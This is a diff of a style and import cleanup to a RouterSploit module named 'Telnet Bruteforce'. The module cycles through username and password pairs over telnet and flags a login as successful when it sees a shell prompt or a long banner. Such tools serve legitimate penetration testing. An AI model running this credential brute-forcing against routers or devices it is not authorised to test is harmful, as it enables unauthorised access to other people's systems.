@@ -2,7 +2,15 @@ import threading
 import itertools
 import telnetlib
 
-from routersploit import *
+from routersploit import (
+    exploits,
+    wordlists,
+    print_status,
+    print_error,
+    LockedIterator,
+    print_success,
+    print_table,
+)
 
 
 class Exploit(exploits.Exploit):
@@ -12,7 +20,7 @@ class Exploit(exploits.Exploit):
     """
     __info__ = {
         'name': 'Telnet Bruteforce',
-        'author': 'Marcin Bury <marcin.bury[at]reverse-shell.com>' # routersploit module
+        'author': 'Marcin Bury <marcin.bury[at]reverse-shell.com>'  # routersploit module
     }
 
     target = exploits.Option('', 'Target IP address')
@@ -55,7 +63,7 @@ class Exploit(exploits.Exploit):
             print_table(headers, *self.credentials)
         else:
             print_error("Credentials not found")
-            
+
     def target_function(self, running, data):
         name = threading.current_thread().name
 
@@ -79,13 +87,13 @@ class Exploit(exploits.Exploit):
                         tn.write(password + "\r\n")
                         tn.write("\r\n")
 
-                        (i,obj,res) = tn.expect(["Incorrect", "incorrect"], 5)
+                        (i, obj, res) = tn.expect(["Incorrect", "incorrect"], 5)
                         tn.close()
 
                         if i != -1:
                             print_error(name, "Username: '{}' Password: '{}'".format(user, password))
                         else:
-                            if any(map(lambda x: x in res, ["#", "$",">"])) or len(res) > 500: # big banner e.g. mikrotik
+                            if any(map(lambda x: x in res, ["#", "$", ">"])) or len(res) > 500:  # big banner e.g. mikrotik
                                 running.clear()
                                 print_success("{}: Authentication succeed!".format(name), user, password)
                                 self.credentials.append((user, password))
@@ -99,6 +107,5 @@ class Exploit(exploits.Exploit):
                             print_error("Too much connection problems. Quiting...")
                             return
                         continue
-
 
         print_status(name, 'thread is terminated.')
